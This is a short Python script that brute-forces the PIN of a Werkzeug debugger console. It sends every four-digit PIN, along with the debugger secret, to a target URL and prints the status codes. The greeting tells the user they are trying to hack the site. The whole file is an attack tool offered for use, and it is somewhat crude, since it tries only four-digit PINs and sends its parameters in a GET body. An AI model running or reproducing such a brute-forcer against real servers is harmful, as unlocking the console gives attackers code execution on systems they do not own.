#!/bin/python3
"""
Author: Thomas B.
Purpose: Fuzz a Werkzeug pin console
"""

import argparse
import os
import requests


# --------------------------------------------
def get_args():
    parser = argparse.ArgumentParser(description="Pin fuzzing for a Werkzeug console URL")
    parser.add_argument('url', help='URL with a PIN console, e.g. http://vulnsite.com:80/console')
    parser.add_argument('-s', '--secret', metavar='secret', help='Werkzeug debugger secret')
    return parser.parse_args()
    
# --------------------------------------------
def main():
    args = get_args()
    print('Hello, You\'re trying to hack: ' + args.url + 
          '\nWerkzeug secret: ' + args.secret, end='\n--------------------\n')

    for pin in range(10000):
        spin = f"{pin:04d}"
        print('Pin tested: \t', pin, '\t', spin)
        #r = requests.get(args.url) # test
        try:
            r = requests.get(args.url, data={'s': args.secret, '__debugger__': 'yes', 'cmd': 'pinauth', 'pin': spin})
            # print('Request URL: ', r.url) # test
            print('\tStatus code: \t\t', r.status_code, '\n\tContent length: \t\t', len(r.content))
            # print('\tContent:\n', r.content, end='\n--------------------\n')
            # exit()
        except:
            print("Connexion reset by peer, retry pin manually: ", pin, spin)

# --------------------------------------------
if __name__ == '__main__':
    main()


